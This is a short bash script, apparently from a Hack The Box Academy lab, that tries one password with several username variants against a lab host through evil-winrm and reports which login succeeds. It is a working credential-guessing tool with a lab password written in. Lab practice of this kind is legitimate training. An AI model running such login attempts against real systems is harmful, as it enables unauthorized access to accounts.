#!/bin/bash

IP="10.129.202.137"
PASSWORD='@HTB_@cademy_stdnt!'
USERNAMES=("Bob" "bob" "FrontDesk01\\Bob" "Bob@FrontDesk01" ".\\Bob")

for USER in "${USERNAMES[@]}"; do
  echo "[*] Testing: $USER"
  evil-winrm -i "$IP" -u "$USER" -p "$PASSWORD" -s "C:\Users" -c "whoami" > /dev/null 2>&1
  if [[ $? -eq 0 ]]; then
    echo "[+] SUCCESS with $USER:$PASSWORD"
    exit 0
  else
    echo "[-] FAIL for $USER"
  fi
done
